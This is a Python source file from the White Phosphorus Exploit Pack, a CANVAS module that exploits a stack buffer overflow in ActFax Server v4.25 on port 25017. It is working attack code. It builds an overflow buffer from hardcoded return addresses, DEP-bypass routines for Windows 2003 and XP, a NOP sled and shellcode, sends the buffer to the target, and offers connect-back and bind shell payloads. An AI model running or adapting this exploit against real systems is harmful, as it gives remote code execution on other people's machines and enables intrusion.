
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer

######################################################################################
NAME = "ActFax Server v4.25 Remote Exploit"
DESCRIPTION = "Exploits a stack based overflow in the ActFax service listening on port 25017"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']="ActFax Communication-Software GmbH"
DOCUMENTATION["Repeatability"]="Multiple Tries"
DOCUMENTATION["References"] = "http://www.actfax.com/"

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP","2000"]

NOTES="""
Exploits a ret address overwrite.
"""
PORT = 25017
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Autoversioning", (0x00000000), []],
    1 : ["Windows 2003 SP1-SP2 DEP", (0x00000000), [WIN2K3SP1, WIN2K3SP2]],
    2 : ["Windows XP SP2-SP3 DEP", (0x00000000), [WINXPSP2, WINXPSP3]],
    3 : ["Windows Other", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20\x25\x26\x2b"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return    
        
    def test(self):
        # Simple test
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.log('WP> Checking target port')
        ret = wp_isPortOpen(self,self.host,self.port)
        if ret:
            self.log('WP> Checking ftp banner')
            ret2 = wp_bannerchecktest(self,self.host,21,{" ActiveFax Version 4.25 (Build 0221)": 1})
                
        return ret

    def neededListenerTypes(self):
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        if self.version == 0:
            return 0

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        # Autoversioning OS/target detection
        if self.version == 0 and not self.autoVersioned:
            self.version = self.wp_autoVersionTarget(targets)

        return

    def makesploit(self):
        payload = "\x31\x0c\x30"	                              # Required header fluff
        payload += "\x83\xc6\x60\x83\xc6\x60\x83\xc6\x48\x8b\xe6\xc3" # Adjust stack and return to DEP Bypass
        payload += wp_randomstring(257 - len(payload))# Everything prior to the NULL byte must not contain lowercase or NULL
        payload += pack('<L', 0x00402731) 			      # ADD ESP, 210 / RETN - ActSrvNT.exe + Actfax.exe - 3.0.0.150
        payload += wp_randomstring(175)

        if self.version == 1: #2k3 SP1/2
            payload += self.wp_UniversalDEPBypassWin2k3_VP(len(self.shellcode)+8) 
        elif self.version == 2: #XP SP2/3
            payload += self.wp_UniversalDEPBypassWinXP_VP(len(self.shellcode)+8) 
        elif self.version == 3:  #Windows XP/Other Non DEP
            payload += pack('<L', 0x100045A1)  # push esp, pop ebx ActRes.dll
            payload += pack('<L', 0x00402077)  # call ebx ActSrvNT.exe + Actfax.exe
            payload += "\x03"                       # fix the executing instruction
            payload += "\x90"*20

        payload += "\x90"*4
        payload += self.shellcode
        payload += "\r\n\r\n"

        return payload


    def run(self):
        self.getArgs()

        if self.version == 0:
            self.log("WP> Autoversioning failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        try:

            payload = self.makesploit()

            self.log("WP> Connecting to target: %s:%d"%(self.host,self.port))
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("WP> Sending Exploit")
            s.sendall(payload)

            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()

        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0        

        time.sleep(2)
        
        # Check if follow up is required for some shellcodes
        ret = self.wp_postExploitShellcode(s)
        if ret:
            return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret


if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
